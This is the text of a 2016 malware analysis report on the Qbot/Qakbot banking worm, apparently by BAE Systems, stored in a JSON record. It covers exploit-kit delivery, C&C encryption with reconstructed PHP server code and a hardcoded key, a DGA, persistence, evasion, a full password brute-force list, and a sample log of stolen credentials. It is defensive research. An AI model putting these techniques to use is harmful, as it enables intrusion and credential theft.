{
    "id": "45c5592f-068c-40b2-911a-fb5db8b79569",
    "created_at": "2022-10-25T16:48:19.89003Z",
    "updated_at": "2025-03-27T02:08:23.134684Z",
    "deleted_at": null,
    "sha1_hash": "0f813f0acc7498e2a4e91d1c59dbc0245f887c4e",
    "title": "",
    "authors": "",
    "file_creation_date": "2016-04-06T12:14:33Z",
    "file_modification_date": "2016-04-07T16:49:56Z",
    "file_size": 8818684,
    "plain_text": "# The Return of Qbot\n\n\n-----\n\n## Background\n\nQbot, also known as Qakbot, is a network-aware\nworm with backdoor capabilities, primarily\ndesigned as a credential harvester. It is an old\nthreat and was well-described by Symantec back\nin 2009.[1] The company later released a whitepaper\nwhich described Qbot version 910 in great detail.[2]\n\nIn December 2015, several researchers reported that\nwebsites hosting the Rig Exploit Kit were serving an\nupdated version of Qbot.[3 4 5] Then in January 2016,\nover 500 devices at a large public organisation were\ninfected with Qbot: the worm was back, and it was\nboth more and less effective. While all versions\nof Microsoft Windows the worm touched in the\nattack were compromised, a number of Windows\nXP machines crashed and failed to restart: despite\nits renewed potency, the programmers behind Qbot\nhadn’t built their bot to be compatible with older\nversions of Windows.\n\nBAE Systems’ Incident Response team were called in\nto investigate the ongoing infection and support in\ncontaining and remediating the threat. A number\nof Qbot samples were found within the victim\norganisation’s network; all samples polymorphic\nvariations of the same Qbot family.\n\nFurther research and tracking of the campaign led\nus to discovery of a sizeable botnet, consisting of\nover 54,517 distinct infected machines across a\ntwo-week investigation period. The vast majority of\nthese (over 85%) were located in the United States.\n\nThis report seeks to provide a description of\nunique and previously unseen aspects of Qbot\nfunctionality primarily, including delivery methods\nand supporting infrastructure. However, we also\ndescribe multiple known aspects of Qbot, especially\nwhere those aspects are important and may\nhave been modified or redesigned, making them\ndifferent from previous versions.\n\nThe report describes a sample with MD5\nb725adc8f99196000ff7aa7382803cba, available\nfor download from VirusTotal. However the\nfunctionality discussed is valid for the entire family\nof this bot generation, including an unlimited\nnumber of polymorphically modified versions we\nwill discuss later in the report.\n\n\n-----\n\nFigure 1 - Distribution of victims\n\n1 http://www.symantec.com/security_response/writeup.jsp?docid=2009-050707-0639-99\n\n2 http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_qakbot_in_detail.pdf\n\n3 https://isc.sans.edu/forums/diary/Actor+using+Rig+EK+to+deliver+Qbot+update/20551/\n\n4 https://blogs.forcepoint.com/security-labs/public-holidays-website-leads-rig-ek-drive-download-qakbot-malware\n\n5 h l ffi l i i d h l\n\n\n-----\n\n## Analysis\n\n#### Rig Exploit Kit\n\n##### Compromised website\n eaaforums.org\n\n Malicious Javascript eaaforums.org/clientscript/vbulletin-core.js\n\n Rig Gate URL sc.ghandiprobably.com/{2,6}viewforum{2,6}.php\n\n Rig Landing Page sf.cio-inspired.com\n\nFigure 2 – Rig EK Infection chain\n\nIn the Qbot infection chain, the actors have used Rig Exploit Kit (EK) to deliver their payload. The use of\nexploit kits within Qbot’s delivery method is not a new one, being seen previously utilising the Sweet Orange\nEK in 2014 and early 2015. As can be seen in Figure 2, the actors first compromise a legitimate website, gaining\nsome form of write access to the backend. This allows them to include malicious JavaScript (JS) on the site\n(Step 2 in Figure 2 above). For this campaign, malicious JS has been seen appended to the start or end of a\nlegitimate JavaScript file, typically to avoid identification.\n\n\n-----\n\nThe JS used in this exploit is obfuscated using random variable names, alongside functions to dynamically\ngenerate the following Rig Gate URL (Step 3 in Figure 2 above). The exact page generated varies each time,\nwith between two and six characters appended to the start and end of the requested file, produced as a result\nfrom two functions within the JS. The target site however does not change; this is hardcoded into the JS,\noften seen with Unicode characters as further obfuscation.\n\nFigure 4 – Response from Rig EK Gate; obfuscated (left), deobfuscated (right)\n\nThe role of the Rig Gate URL is to serve an active Rig landing page which can be used to carry out the exploit.\nOn response from the Rig gate, a variable named main_color_handle is returned, which contains a large string\nof characters that is further used to determine the Rig EK landing page in. This string goes through a function\nwhich replaces all illegal characters in HEX notation, keeping only 0-9 and a-f. Translating the result from HEX\nto ASCII will bring you the landing page, placed into an iframe on the current page, which begins the exploit.\n\n\n## In the Qbot infection chain, the actors have used Rig Exploit Kit to deliver their payload\n\n\n-----\n\n#### Rig EK Infrastructure\n\nFor their delivery through Rig EK, the actors have adopted a two-tier model, with both a Gate and Landing\npage. The actors have ensured that for each IP address, a new set of domains are used. However, as they are\ncurrently densely populating each IP with many sub-domains, it gives us great visibility of the compromised\nsites that they are currently using for exploitation through Rig EK.\n\nThroughout the investigation, we noticed that all domains used for both the gate and landing page were\nregistered through GoDaddy. We believe that the actors gained access to a set of compromised GoDaddy\ncredentials, using these to access accounts and create subdomains which point to different name servers. Many\nof the domains are associated with the same GoDaddy accounts, indicating that they are exploiting all possible\ndomains on any account which they gain access to.\n\nFigure 5 – Rig EK Gate Infrastructure\n\n\n-----\n\nFor the gate infrastructure seen in Figure 5 – Rig EK Gate Infrastructure, the actors have only seemingly setup\nsix different sub-domains to be used, also placing these domains on shared infrastructure hosted by HostGator.\nThis is a different approach that has been taken with Rig landing pages, detailed further below.\n\nFigure 6 – Rig EK Landing Page Infrastructure\n\nFor Rig landing pages, the attackers have been seen using four IP addresses, each hosting a large number of\ncompromised domains. Figure 6 shows a small portion of the domains that are seen on each IP address. A full\nlist of these domains can be found in Appendix A.\n\nThe compromised sub-domains appeared on the first IP address from the 17th December 2015, which correlates\nwith the time that open source feeds began reporting the use of Rig EK to drop Qbot. Whilst all sub-domains\nare currently still active on the first IP, three further waves of new sub-domains were seen to be pointing to\nnew IP addresses; 46.30.43[.]188 from the 17th January 2015, 188.227.18[.]185 from the 25th January 2016 and\n188.227.16[.]59 from the 7th February 2016. All these subdomains follow the trend of having only two or three\nletters for the subdomain.\n\n\n-----\n\n## Installation\n\nOnce delivered through Rig (or other means such as email attachments) the bot registers itself on the system,\nperforms a speed test to determine the network link bandwidth, contacts the Command and Control (C&C)\nvia its internal Domain Generation Algorithm (DGA) and sends an initial beacon to the FTP server. The beacon\ncontains a list of installed software, if the local user has admin rights and external IP address of the infected\nnetwork.\n\n#### Memory Injection\n\nThe malware injects itself into the running process explorer.exe. Whenever another process starts up, that\nprocess will also be infected. The injected component of the bot is a DLL. When run, the DLL will extract its\nstrings, configuration, APIs, and critical strings block into heap-allocated buffers.\n\nTo coordinate the functions of all the injected instances, Qbot uses IPC (inter-process communication) based on\nmemory pipes.\n\n#### Configuration\n\nQbot has an internal table that stores configuration parameters to use. This starts as a default table,\ncontaining FTP credentials, C&C settings and timestamps. Qbot then updates some of its parameters, such as\n‘croncache’ that appears to cache intercepted data hashes:\n\nThe configuration table can then be updated with new parameters too, such as:\n\n\nip=[EXTERNAL_IP_ADDRESS]\ncondvrf=-182152194\nlu_si=1453572879\nnattun_next_connect_time=1453678387\n\n\n**Where:**\n\n'lu_si' parameter specifies the timestamp for the 'last upload of the system information'\n'nattun_next_connect_time' specifies the timestamp related for the next time for connection to the backconnect server.\n\n\n-----\n\n#### Speed Test\n\nThe bot tests the network speed by downloading a file from the following URL:\n\n\nhttp://[WORD].speedtest.comcast.net/speedtest/random750x750.jpg?x=[RANDOM_NUMBER]&\n\n\nWhere [WORD] is a word from the following list: \"sanjose\", \"boston\", \"jacksonville\", \"houston\".\n\n\n#### Hooks\n\nQbot places the following system-wide inline\nhooks. For example:\n\nFor network traffic interception/modification:\n\n- ws2_32.dll\n\n   - connect()\n\n   - send()\n\n   - WSAConnect()\n\n   - WSASend()\n\n- wininet.dll\n\n   - HttpOpenRequestA() /\nHttpOpenRequestW()\n\n   - HttpSendRequestA() / HttpSendRequestW()\n/ HttpSendRequestExW()\n\n   - InternetCloseHandle()\n\n   - InternetQueryDataAvailable()\n\n   - InternetReadFile() / InternetReadFileExA()\n\n   - InternetWriteFile()\n\n- nss3.dll\n\n   - PR_Write()\n\n   - PR_Close()\n\n   - PR_Read()\n\nTo modify FireFox response to fake/redirect\nwebsites with the self-signed certificates:\n\n- nspr4.dll\n\n   - PR_GetNameForIdentity()\n\n   - PR_SetError()\n\n   - PR_GetError()\n\n\nFor new process infection:\n\n- ntdll.dll\n\n   - LdrLoadDll()\n\n   - NtResumeThread()\n\nFor stealing data entered into data fields:\n\n- user32.dll\n\n   - GetClipboardData()\n\n   - TranslateMessage()\n\nTo hide its presence on a system:\n\n- kernel32.dll\n\n   - FindFirstFileA() / FindFirstFileW()\n\n   - FindNextFileA() / FindNextFileW()\n\n- ntdll.dll\n\n   - ZwQuerySystemInformation()\n\n- advapi32.dll\n\n   - RegEnumValueA() / RegEnumValueW()\n\nTo hide its network connections:\n\n- iphlpapi.dll\n\n   - GetTcpTable()\n\n   - AllocateAndGetTcpExTableFromStack()\n\nThe hooks are not placed into the following\nprocesses:\n\n- msdev.exe\n\n- dbgview.exe\n\n- ollydbg.exe\n\n- ctfmon.exe\n\n- Proxifier.exe\n\n- nav.exe\n\n\n-----\n\n#### Version number\n\nInternally, the bot’s version number is hard-coded at the relative virtual offsets 0x22000 and 0x22004. For\nexample, if the image base of the bot’s DLL is 0xB60000, the bot version number “300.262” can be found at\n\n\nseg000:00B82000 00 03 00 00       version_MAJOR  dd 300h\n\nseg000:00B82004 06 01 00 00       version_MINOR  dd 262\n\n\nThe major version number is then formatted as a hexadecimal number, and the minor one - as decimal:\n\n\nwvnsprintf(&version_formatted, 64, \"%04x.%u\", version_MAJOR, version_MINOR);\n\n\nWe have analysed around 100 samples submitted to VirusTotal from the 18th December 2015 to the 18th\nFebruary 2015, and made a correlation between the samples’ compile time (X-Axis) and the minor version\nnumber embedded into the bot (Y-Axis).\n\nThe dependency between the two is shown below:\n\n400\n\n350\n\n300\n\n250\n\n200\n\n150\n\n100\n\n50\n\n0\n\n16 Dec 29 Dec 05 Jan 15 Jan 25 Jan 04 Feb 14 Feb\n\nFigure 7 – Qbot compile time vs. minor version number\n\nAs can be seen the increment of the version number is quite linear. The incremented versions are not always\n‘released’, that is, pushed for download from the C&C. For instance, there are days when two updated versions\nare released, having an increment in the minor version number of up to nine. We can assume that there is a\nseparate pipeline that automatically re-compiles and re-encodes updated versions. This pipeline produces a\nnew version approximately every six hours. The attackers then take the next available version from the pipeline\nand make it available for the bot upgrade from the C&C through the ‘updbot’ function.\n\n\n-----\n\n## Detection avoidance techniques\n\n#### Self-Protection, Encrypted Strings\n\nThe bot protects itself with a fairly complex runtime encryptor. Beneath the encryptor, it keeps\nits APIs and strings encrypted as well. Apart from\nthat, the most important strings that define\ncritical functionality of the bot are contained in\nanother encrypted block. Whenever a particular\nstring is required, the bot decrypts that block, and\nretrieves the string by its index, then de-allocates\nthe decrypted block. This way, the most critical\nstrings are protected should a memory dump of an\ninfected machine be performed.\n\n#### Anti-VM\n\nQbot is VM-aware, and appears to detect the\npresence of a sandbox to alter its behaviour. Qbot\nuses the following strings for VM detection:\n\n- VMware Accelerated\n\n- Virtual HD\n\n- VirtualBox\n\n- VMware SCSI\n\n- VMware server memory\n\n- VMware Accelerated\n\n- VMware Pointing\n\n- VMware Replay\n\n- VMware SVGA\n\n- QEMU\n\n## Server-based polymorphism allows Qbot to largely avoid AV detection\n\n\n#### Server-based polymorphism\n\nIn the samples analysed, we discovered two levels\nof server-based polymorphism in use.\n\nAt the first level, the binary is modified\nwithout affecting its functionality. This level of\npolymorphism is carried out by the ‘gateway’\nPHP script that runs on the C&C. Each time a new\nsample is retrieved, the C&C script will patch\ntwo large blobs within the binary template with\nrandomly generated data to produce a new copy\nthat will always have a different hash. For this\nreason, sample hashes cannot be used as IOCs.\n\nAt the second level of polymorphism, the entire\nsample is re-compiled and re-encrypted, so that it\nis entirely different in structure. At this level, the\nsample increases its internal version number and it\nmay also get a different configuration file (if the\nattackers so wish), which would contain different\nC&C and FTP exfiltration URLs.\n\nWhen a bot sends a beacon to the C&C, the\nrequest it sends contains the bot’s version number.\nIf the ‘gateway’ PHP script determines that this\nversion is older than the latest version (normally a\nday or two older), it will serve back the ‘updbot’\ntask which means ‘update bot’. When the bot\nreceives back the ‘updbot’ task, it will download\na new version of the bot from the C&C, and then\nrun it to update itself.\n\nThe server-based polymorphism used by Qbot\nallows it to largely avoid AV detection. Typically,\nout of 55 AV vendors, only a couple of reputable\nAV vendors are reliably able to detect Qbot - or\nto be specific, generically detect its external\nencryptor. After a few days, the same sample is\nnormally detected by more than half of the AV\nengines. However, as the bot normally updates\nitself with a new version within a day or two,\nit keeps ahead of this process and remains\nundetected for long periods.\n\n\n-----\n\n## Command and control\n\n#### C&C Protocol\n\nFirst, the bot constructs a string that specifies the protocol version (9), request type (one for the task\nrequest, two for task execution result), BOT_ID (such as jcrrzs748025), formatted Windows version (such as\n6.1.1.7601.1.0.0100), current Qbot version (e.g. 0300.288), AV flag that indicates what kind of AV product was\nfound to be installed among the list of several AV products, and a randomly generated ‘salt’:\n\n\nprotoversion=9&r=1&n=jcrrzs748025&os=6.1.1.7601.1.0.0100&bg=b&it=3&qv=0300.288&ec=1453922906&av=8&sa\nlt=tmTGmgywg\n\n\nNext, Qbot generates a blob that consists of two parts. The first part is a randomly generated 16-byte buffer.\nThe second part is a string \"KoFGsdF8^yhce(ncCxxw\". This string is provided in the critical strings block shown\nearlier in the report.\n\nFollowing that, the generated blob is hashed with SHA1. The hash is then used as a RC4 password to encrypt\nthe constructed string above with the RC4 algorithm.\n\nFinally, the encrypted string is prepended with the randomly generated 16-byte buffer (first part of the blob\nthat was hashed to produce RC4 password), base64-encoded and passed as value in a POST request to the C&C.\n\nWhen C&C's script receives the request from the bot, it base64-decodes the received POST value, takes its first\n16 bytes, appends the critical string \"KoFGsdF8^yhce(ncCxxw\", hashes it with SHA1, and uses the hash to RC4decrypt the data that starts from the byte #17.\n\nThe C&C script code is reconstructed below:\n\n\n$data = base64_decode($value);\n\n$hash = sha1(substr($data, 0, 16).\"KoFGsdF8^yhce(ncCxxw\", TRUE);\n\n$request = rc4($hash, 20, substr($data, 16, strlen($data)-16));\n\n\nThe C&C script then parses the string and extracts the 'salt' parameter. This parameter will be used in its\nresponse back to the bot. If the bot does not receive the same 'salt' value as in its request to the C&C, it will\ndiscard such a response as non-authenticated.\n\nThe C&C's response has the following response format:\n\n\n\n[TASK_ID]&[SALT]&[IP]&[TASK]\n\n\nWhere [TASK_ID] specifies either 0 for an empty task (when the C&C has no task for the bot), or a non-zero\nnumber for a non-empty/valid task, such as 'updbot' task enlisted before.\n\nThe bot does not seem to care what [TASK_ID] number is specified for a valid task - it only checks to make\nsure the [TASK_ID] is not 0. If so, it parses the [TASK] parameter to see what the actual task is. Otherwise, it\nconsiders such response as 'there is no task to execute'.\n\n\n-----\n\nThe [SALT] is the same as in the request, and the [IP] is an external IP of the victim as seen by the server,\nencoded as an integer value; the bot uses this IP and then reports it as its own external IP for its further\ncommunications with C&C. For example, the bot may first report ext_ip=[?] in its ‘beacon’ request to the\nC&C, but once it learns its external IP from the response, it will then specify it in the ext_ip field of following\n‘beacon’ requests.\n\nThe C&C’s response is then encrypted, base64-encoded and served back to the bot using the same steps as\nbefore, as demonstrated with the reconstructed code below:\n\n\n$ip  = $_SERVER['REMOTE_ADDR'];\n$long = ip2long($ip);\n$ip = sprintf(\"%08X\", $long);\n$resp = $task_id . \"&\" . $salt . \"&\" . $ip . \"&\" . $task;\n$pass = '';\nfor ($i = 0; $i < 16; $i++)\n{\n$pass .= chr(mt_rand(0, 255));\n}\n$hash = sha1($pass.\"KoFGsdF8^yhce(ncCxxw\", TRUE);\n\necho base64_encode($pass . rc4($hash, 20, $resp));\n\n\nWhen the bot receives a response, it decrypts it the same way as the server decrypted the bot's request, again\nreading the [TASK_ID] field from it. If it's non-zero, it will execute the intended task. The task may specify\nadditional parameters. Once the task is executed, the result of its execution is then posted again to the server\nusing the same encryption.\n\n\n-----\n\nThis time however, the request will have a different format: the bot composes a string that specifies the\nprotocol version ('9'), request type ('2' for task execution result), BOT_ID (such as 'jcrrzs748025'), executed task\nID (e.g. '77'), task execution result ('0'), and task execution output, such as '(null)' in case there is no output:\n\n\nprotoversion=9&r=2&n=jcrrzs748025&tid=77&rc=0&rdescr=(null)\n\n\nQbot recognises and executes the following tasks from the C&C server:\n\nTask Description\n\ncc_main post logs to C&C\n\ncertssave steal certificates\n\nckkill delete all cookies\n\nforceexec run specified file as \"explorer.exe %s.exe\"\n\ngrab_saved_info collect cookies, flash cookies, steal multiple creds, certificates\n\ninstwd install with the scheduler\n\ninstall3 download specified file, run as \"explorer.exe %s.exe\"\n\nkillall terminate all processes with the specified name\n\nloadconf load specified config parameter\n\nnattun connect to backconnect server (e.g. 193.111.140[.]236:65200)\n\nnbscan replicate across the network\n\nreload reload itself\n\nrm rename file as %s.removeme\n\nsaveconf export config into log\n\nthkillall terminate all threads for all processes with the specified name\n\nuninstall uninstall itself\n\nupdbot download new bot, execute\n\nupdwf same as updbot, only run with /w switch\n\nuploaddata upload collected logs to FTP servers\n\nvar read specified configuration value\n\ngetip does nothing\n\nwget download and save the specified file\n\nTable 1: Remote commands/tasks\n\n|Task|Description|\n|---|---|\n|cc_main|post logs to C&C|\n|certssave|steal certificates|\n|ckkill|delete all cookies|\n|forceexec|run specified file as \"explorer.exe %s.exe\"|\n|grab_saved_info|collect cookies, flash cookies, steal multiple creds, certificates|\n|instwd|install with the scheduler|\n|install3|download specified file, run as \"explorer.exe %s.exe\"|\n|killall|terminate all processes with the specified name|\n|loadconf|load specified config parameter|\n|nattun|connect to backconnect server (e.g. 193.111.140[.]236:65200)|\n|nbscan|replicate across the network|\n|reload|reload itself|\n|rm|rename file as %s.removeme|\n|saveconf|export config into log|\n|thkillall|terminate all threads for all processes with the specified name|\n|uninstall|uninstall itself|\n|updbot|download new bot, execute|\n|updwf|same as updbot, only run with /w switch|\n|uploaddata|upload collected logs to FTP servers|\n|var|read specified configuration value|\n|getip|does nothing|\n|wget|download and save the specified file|\n\n\n-----\n\n#### External IP\n\nQbot also uses the following websites to obtain its own external IP, if not provided by the C&C server:\n\nhttp://forumity.com/show-ip.php - looks for the IP between the strings ‘var ip = “’ and ‘”;’.\n\nhttp://www.ip-adress.com - looks for the IP between the strings ‘IP address is: ‘ and ‘<’.\n\n#### DGA\n\nQbot has a ‘reserved’ domain name in the code. Two have been seen used in recent weeks:\n\n\nhttp://stat.nickspizzade[.]com\n\nhttp://rss.dimadimapress[.]com\n\n\nThese are compromised websites, and have been in the Qbot codebase since 2013.[7]\n\nThe PHP script name is calculated by Qbot is based on basic system information. For an update, it may look like:\n\n\neQ4YoJxR5J.php\n\n\nFor posting the system information, it may look like:\n\n\neQ4YoMlMwQjNdN0A2Q2tBIVh5W.php\n\n\nThe following PHP script is used for a check - it returns “ok” when called:\n\n\neQ4YoIhR5S.php\n\n\n7 h h f i i f i fil k\n\n\n-----\n\nFor all observed C&C communications, Qbot uses a\nDomain Generation Algorithm (DGA).\n\nIf there is a process running with one of the\nfollowing names, or there is a wpcap.dll module\nloaded into any running process, the DGA will\nnot proceed.\n\n- tcpdump.exe\n\n- windump.exe\n\n- ethereal.exe\n\n- wireshark.exe\n\n- ettercap.exe\n\n- rtsniff.exe\n\n- packetcapture.exe\n\n- capturenet.exe\n\nThe DGA is based on a date - Qbot reads the\ncurrent date from the 'Date:' HTTP header\nreturned by google.com, microsoft.com, and cnn.\ncom. Each month is split into three periods: from\none to 10, from 11 to 20, and from 21 till the end\nof the month. Qbot calculates a list of domains for\neach such period, this having 36 distinct sets per\nyear.\n\nThe TLD can one of the following: .com, .net, .org,\n.info, .biz, .org.\n\n\nThere no limit for the number of domains in a set:\nQbot generates the first five DGA domains, and\nthen tries to resolve starting from the first domain\nin the list. If it fails to resolve the generated\ndomains, it will generate another five, and so\non, until the domain resolves. For each domain,\nit makes a DnsQuery() to get a NS record of the\ndomain. If the NS record contains the string\n'sinkhole' in it, the DGA will not proceed.\n\nFor example, for the dates from the 21st February\n2016 to 29th February 2016, Qbot generates these\ndomains:\n\n- jekawtzb[.]net\n\n- lbcoqzad[.]net\n\n- kqzjcgrrflbvybuaejdexttlt[.]biz\n\n- awtptzoblgkkdmfb[.]biz\n\n- nbszdxmz[.]org\n\n- ...\n\n## For all observed C&C communications, Qbot uses a Domain Generation Algorithm\n\n\n-----\n\nFrom analysing registered domains, we have seen a quite sporadic registration of DGA domains, especially prior\nto early December. Figure 8 outlines the registrations of all DGA domains, starting in late September 2015.\n\n21\\09\\15 01/10/15 11/10/15 21/10/15 01/11/15 11/11/15 21/11/15 01/12/15 11/12/16 21/12/15 01/01/16 11/01/16 21/01/16 01/02/16 11/02/16\n\nFigure 8 - Registrations of DGA Domains\n\nBefore December, domains were registered at largely irregular intervals, many being registered past the first\ndate of DGA operation. This correlates with the appearance of Rig EK infrastructure in December, suggesting\nthat the actors were developing and testing the latest variant of Qbot before deployment through Rig EK.\nFollowing this the domains have been registered ahead of the first date of operation, ensuring that infected\nvictims can communicate with the C&C servers.\n\nDGA Date Domains\nregistered\n\n##### Distribution of DGA domains\n\n21/09/2015 2\n\n01/10/2015 2\n\n21/10/2015 2\n\nPosition of DGA\n\n01/11/2015 3\n\n1-5\n\n11/11/2015 2\n\n21/11/2015 2 6-10\n\n01/12/2015 7\n\n11-15\n\n11/12/2015 11\n\n16-20\n\n21/12/2015 15\n\n01/01/2016 6 21-25\n\n|DGA Date|Domains registered|\n|---|---|\n|21/09/2015|2|\n|01/10/2015|2|\n|21/10/2015|2|\n|01/11/2015|3|\n|11/11/2015|2|\n|21/11/2015|2|\n|01/12/2015|7|\n|11/12/2015|11|\n|21/12/2015|15|\n|01/01/2016|6|\n|11/01/2016|8|\n|21/01/2016|7|\n|01/02/2016|12|\n|11/02/2016|5|\n\n\n-----\n\n## The actors register over 69% of their domains from the top 10 generated\n\nThe actors have registered a varying number of domains for each 10-day period, seen in Table 2. Some of these\ndomains were registered after the first date of DGA operation, which suggests that the actors are purchasing\nfurther domains and infrastructure possibly reacting to previous domains in the DGA chain being blacklisted. The\nactors register over 69% of their domains from the top 10 generated, and over 97% within the top 20, seen in\nthe figure above.\n\n#### Persistence\n\nWhen run, Qbot drops itself into a newly created directory, within one of the existing %APP_DATA%\ndirectories, such as:\n\n%APP_DATA%\\Microsoft\\[random_name]\\[random_name].exe\n\nIt then registers itself as a service, using an existing service name and depending on another existing service.\nFor example, it may register itself with the following service parameters:\n\nImagePath: \"%APP_DATA%\\Microsoft\\[random_name]\\[random_name].exe /D\"\nDisplayName: \"Remote Procedure Call (RPC) Service\"\nDependOnService: 'Dnscache'\nObjectName: \"LocalSystem\"\nStart type: Automatic\nService status: Stopped\n\nWhere \"Remote Procedure Call (RPC)\" and \"Dnscache\" are existing services which are running on the target system.\n\nIt then creates an auto-run registry entry:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[random_name] =\n\"%APP_DATA%\\Microsoft\\[random_name]\\[random_name].exe\"\n\nIf possible, Qbot will attempt to piggy-back on an existing auto-run entry, modifying this entry to start Qbot\ninstead, passing a parameter to also run the intended application as well. For example, the messenger's key\nMSMSGS is modified as:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MSMSGS =\n““%APP_DATA%\\Microsoft\\[random_name]\\[random_name].exe\" /c \"[PATH]\\msmsgs.exe\" /background\"\n\nNOTE: the [random_name] is not in fact random; it's calculated from the system footprint. Hence, if the bot is\nexecuted on a previously cleaned machine, it will generate the same [random_name], as the system footprint\ndid not change.\n\n\n-----\n\n## Lateral movement - Network replication\n\nQbot attempts to spread to open shares across a network, including the default shares C$ and Admin$. In case\nof weakly-restricted shares, it brute-forces them with the following passwords:\n\n\n123,password,Password,letmein,1234,12345,123456,1234567,12345678,123456789,1234567890,qwerty,love,iloveyou,princess,pussy,\n\nmaster,monkey,abc123,99999999,9999999,999999,99999,9999,999,99,9,88888888,8888888,888888,88888,8888,888,88,8,77777777,\n\n7777777,777777,77777,7777,777,77,7,66666666,6666666,666666,66666,6666,666,66,6,55555555,5555555,555555,55555,5555,555,55,\n\n5,44444444,4444444,444444,44444,4444,444,44,4,33333333,3333333,333333,33333,3333,333,33,3,22222222,2222222,222222,22222,\n\n2222,222,22,2,11111111,1111111,111111,11111,1111,111,11,1,00000000,0000000,00000,0000,000,00,0987654321,987654321,87654321,\n\n7654321,654321,54321,4321,321,21,12,super,secret,server,computer,owner,backup,database,lotus,oracle,business,manager,temporary,\n\nihavenopass,nothing,nopassword,nopass,Internet,internet,example,sample,love123,boss123,work123,home123,mypc123,temp123,\n\ntest123,qwe123,pw123,root123,pass123,pass12,pass1,admin123,admin12,admin1,password123,password12,password1,default,foobar,\n\nfoofoo,temptemp,temp,testtest,test,rootroot,root,fuck,zzzzz,zzzz,zzz,xxxxx,xxxx,xxx,qqqqq,qqqq,qqq,aaaaa,aaaa,aaa,sql,file,web,foo,\n\njob,home,work,intranet,controller,killer,games,private,market,coffee,cookie,forever,freedom,student,account,academia,files,windows,\n\nmonitor,unknown,anything,letitbe,domain,access,money,campus,explorer,exchange,customer,cluster,nobody,codeword,codename,\n\nchangeme,desktop,security,secure,public,system,shadow,office,supervisor,superuser,share,adminadmin,mypassword,mypass,pass,Login,\n\nlogin,passwd,zxcvbn,zxcvb,zxccxz,zxcxz,qazwsxedc,qazwsx,q1w2e3,qweasdzxc,asdfgh,asdzxc,asddsa,asdsa,qweasd,qweewq,qwewq,\n\nnimda,administrator,Admin,admin,a1b2c3,1q2w3e,1234qwer,1234abcd,123asd,123qwe,123abc,123321,12321,123123,James,John,Robert,\n\nMichael,William,David,Richard,Charles,Joseph,Thomas,Christopher,Daniel,Paul,Mark,Donald,George,Kenneth,Steven,Edward,Brian,\n\nRonald,Anthony,Kevin,Mary,Patricia,Linda,Barbara,Elizabeth,Jennifer,Maria,Susan,Margaret,Dorothy,Lisa,Nancy,Karen,Betty,Helen,\n\nSandra,Donna,Carol,james,john,robert,michael,william,david,richard,charles,joseph,thomas,christopher,daniel,paul,mark,donald,george,\n\nkenneth,steven,edward,brian,ronald,anthony,kevin,mary,patricia,linda,barbara,elizabeth,jennifer,maria,susan,margaret,dorothy,lisa,\n\nnancy,karen,betty,helen,sandra,donna,carol,baseball,dragon,football,mustang,superman,696969,batman,trustno1\n\n\nApart from that, Qbot attempts to access 'Credential Store' where Windows stores cached passwords for\nnetwork logins. The same repository is used by Outlook, Windows Live Messenger, Remote Desktop, GMail\nNotifier to store authentication passwords. Qbot's code is identical to published source code for dumping\ncached passwords.[8]\n\nIn addition to that, Qbot attempts to access Password Manager of Internet Explorer, to steal cached username/\npassword credentials. This code is also identical to the published source code.[9]\n\nBy using stolen IE credentials, in addition to credentials intercepted from the network traffic, Qbot attackers\nare able to gain access to other FTP servers that may be used to infect other websites with the exploit kits, in\norder to disseminate their malware further.\n\n8 http://securityxploded.com/networkpasswordsecrets.php#Recover_Domain_Network_Passwords\n\n9 h i l d d i d h\n\n\n-----\n\n## Action on objectives\n\n#### HTTP(S) Session Riding\n\nFor inter-process communications, Qbot uses a named pipe called “\\\\.\\pipe\\[RANDOM_NAME]sp”, where\n\n[RANDOM_NAME] is the calculated name of the Qbot used for installation, e.g. there will be [RANDOM_\nNAME].exe and [RANDOM_NAME].dll files in the system.\n\nThis memory pipe is then used for IPC communications between the components of Qbot injected into other\nbrowsers and the main Qbot module that operates under an explorer.exe process. When the HTTP traffic is\nintercepted, Qbot’s browser instance will check if the bank is targeted; for example, if it matches list entries\nsuch as ‘tdetreasury.tdbank.com, cmoltp.bbt.com, etc.’. If so, it will intercept banking session details and then\nwrite this data into the memory pipe. The explorer.exe instance of Qbot will read this data from the pipe, and\nthen submit it to the remote server.\n\nFor this, it firstly calculates a PHP script name, such as eQ4YoIhR5S.php. The name is calculated from a salt ‘/s’.\n\nNext, it composes a request string: a=[BOT_ID]&b=[INTERCEPTED_DATA_BYTES]\n\nFor example, the request might look like:\n\n\narticle_[BOT_ID]_[time_stamp].zip\n\n\nWhere:\n\n[time_stamp] is a timestamp in Unix/Epoch format, such as 1454337359,\n\n[BOT_ID] is a calculated based on a system fingerprint and consists of 6 random characters followed with 6\nrandom letters.\n\nFor example: the uploaded file may be named article_xreslt118448_1454355888.zip\n\nThe attackers then run a script that will access the FTP servers, download the logs, decrypt and uncompress\nthem. The information in these logs can then be used by the attackers to mount additional attacks against the\nvictims' corporate and personal accounts, or simply be sold to other cyber-criminal groups.\n\n\n-----\n\nAn example of a decrypted log is provided below - it shows an example of how intercepted data is displayed.\nThe last message in the log is a 'beacon' - it displays basic system information about the victim, including the\nlist of installed software, IP address, BOT version number, Windows version number and the like.\n\n\nt=s2 time=[12:47:0-21/1/2016] type=[1] name=[MicrosoftAccount:user=victims_email@hotmail.com]\ndata=[intercepted_login_data_in_clear_text] username=[victims_email@hotmail.com]\nt=kb time=[3:29:31-2/2/2016] p=[C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE]\nb=[entire document typed in word is displayed here]\nt=kb time=[13:28:32-21/1/2016] p=[C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE] b=[credentials typed\nin IE are intercepted and displak<BACKSP>yed here<RIGHT><RIGHT>]\nt=h2 time=[12:36:49-1/2/2016] url=[https://www.facebook.com/login.php?login_attempt=1&lwv=110]\ndata=[lsd=AVoTdXUl&email=victims_email@yahoo.com&pass=secret_password&default_\npersistent=0&timezone=360&...] referer=[https://www.facebook.com/?_rdr=p] cookie=[_js_\ndatr=waWvVsBo-P27uMG5NEQVGeLE; _js_reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2F; _js_\nreg_fb_gate=https%3A%2F%2Fwww.facebook.com%2F; x-referer=https%3A%2F%2Fwww.facebook.\ncom%2F%3F_rdr%3Dp%23%2F%3F_rdr%3Dp] pid=[27344]\nt=i1 time=[13:47:41-21/1/2016] ext_ip=[IP_ADDRESS] dnsname=[DNS_NAME] 